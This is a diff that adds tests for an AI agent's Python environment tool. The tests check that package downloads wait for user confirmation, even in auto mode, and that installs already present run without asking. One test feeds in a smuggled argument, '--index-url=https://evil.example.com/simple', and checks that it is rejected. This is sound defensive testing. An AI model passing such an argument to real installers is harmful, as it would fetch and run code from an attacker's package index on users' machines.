@@ -278,3 +278,75 @@ describe('installing, listing, clearing', () => {
     expect(pythonEnvStatus(opts.root)).toEqual({ ready: false, bytes: 0 });
   });
 });
+
+describe('python_env in a conversation', () => {
+  async function conversation(auto: boolean) {
+    const { startGateway, makeRuntime, captureEvents } = await import('./testing/helpers.ts');
+    const { createPythonTool } = await import('./tools/python-tool.ts');
+    const gw = await startGateway();
+    const installed: string[][] = [];
+    const rt = makeRuntime(gw, { cwd: dir, tools: [createPythonTool({ ...opts, onInstalled: (p) => installed.push(p.map((x) => x.name)) })] });
+    const events = captureEvents(rt);
+    const s = rt.createSession();
+    if (auto) s.setApprovalMode('auto');
+    return { gw, rt, s, events, installed };
+  }
+
+  it('the first download waits for the user, in auto mode too, with what, from where and how big', async () => {
+    const { gw, s, events, installed } = await conversation(true);
+    try {
+      gw.enqueue({ toolCalls: [{ id: 'p1', name: 'python_env', args: { packages: ['pandas'] } }] });
+      const r = await s.send('汇总这个表').done;
+      expect(r.reason).toBe('awaiting_confirm');
+      expect(calls().some((c) => c.args[0] === 'python' && c.args[1] === 'install')).toBe(false); // nothing downloaded
+      const req = events.find((e) => e.type === 'confirm.request');
+      expect(req).toMatchObject({
+        name: 'python_env',
+        cause: 'python_install',
+        install: {
+          python: { version: '3.12.16', host: base.replace('http://', ''), bytes: 31_000_000 },
+          packages: [
+            { name: 'pandas', version: '2.3.3', bytes: 11_000_000 },
+            { name: 'numpy', version: '2.3.4', bytes: 12_800_000 },
+          ],
+          packageHost: base.replace('http://', ''),
+        },
+      });
+      // allowed: installed, and the model is told the python to run
+      gw.enqueue({ text: '好了' });
+      await (await s.confirm('p1', true));
+      const result = JSON.stringify(gw.requests.at(-1)!.body.messages);
+      expect(result).toContain(JSON.stringify(envPython(opts.root)).slice(1, -1));
+      expect(result).toContain('pandas 2.3.3');
+      expect(installed).toEqual([['pandas', 'numpy']]);
+    } finally {
+      await gw.stop();
+    }
+  });
+
+  it('nothing to download: it runs without asking', async () => {
+    await installPython(opts, ['pandas']);
+    const { gw, s, events } = await conversation(false);
+    try {
+      gw.enqueue({ toolCalls: [{ id: 'p2', name: 'python_env', args: { packages: ['pandas'] } }] }, { text: 'ok' });
+      const r = await s.send('再算一次').done;
+      expect(r.reason).toBe('completed');
+      expect(events.some((e) => e.type === 'confirm.request')).toBe(false);
+    } finally {
+      await gw.stop();
+    }
+  });
+
+  it('a refused package request asks nothing and says why', async () => {
+    const { gw, s, events } = await conversation(true);
+    try {
+      gw.enqueue({ toolCalls: [{ id: 'p3', name: 'python_env', args: { packages: ['--index-url=https://evil.example.com/simple'] } }] }, { text: 'ok' });
+      await s.send('装一下').done;
+      expect(events.some((e) => e.type === 'confirm.request')).toBe(false);
+      expect(JSON.stringify(gw.requests.at(-1)!.body.messages)).toContain('not a package name');
+      expect(calls()).toEqual([]);
+    } finally {
+      await gw.stop();
+    }
+  });
+});
